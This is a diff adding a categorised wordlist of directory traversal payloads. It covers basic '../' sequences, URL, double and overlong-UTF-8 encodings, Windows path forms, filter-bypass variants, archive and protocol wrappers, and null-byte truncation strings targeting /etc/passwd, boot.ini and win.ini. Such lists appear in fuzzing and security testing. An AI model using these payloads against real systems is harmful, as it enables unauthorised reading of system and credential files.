@@ -1,0 +1,65 @@
+# Basic Traversal Patterns
+../
+..\
+./
+.\
+/../
+\..\
+.../
+...\
+////
+\\\\
+# Encoded/Obscured Traversal
+%2e%2e%2f
+%2e%2e%5c
+%252e%252e%252f
+..%c0%af
+..%ef%bc%8f
+..%5c
+%2e%2e/
+%2e%2e\
+..%00/
+..%0a
+..%0d
+# Windows-Specific Traversal
+C:\..\
+%SYSTEMROOT%\..\
+%WINDIR%\..\
+\\?\C:\..\
+\\.\C:\..\
+..%c1%9c
+..%e0%80%af
+# Bypass Techniques
+....//
+....\/
+....%2f
+....%5c
+/./../
+/.\../
+\.\./
+/.././
+//../
+\\..\
+\/\/
+/\../
+/..;/
+..\../
+..//
+..\\
+# Special Cases & Wildcards
+~
+$PATH/../../
+${PATH}../../
+@/../../
+#/../../
+# Archive/Protocol Traversal
+zip://../
+phar://../
+jar://../
+file:///etc/passwd
+\\UNC\share\..\..\
+# Null Byte & Truncation
+../../etc/passwd%00
+..\..\boot.ini\x00
+/etc/passwd\0
+C:\Windows\win.ini%00
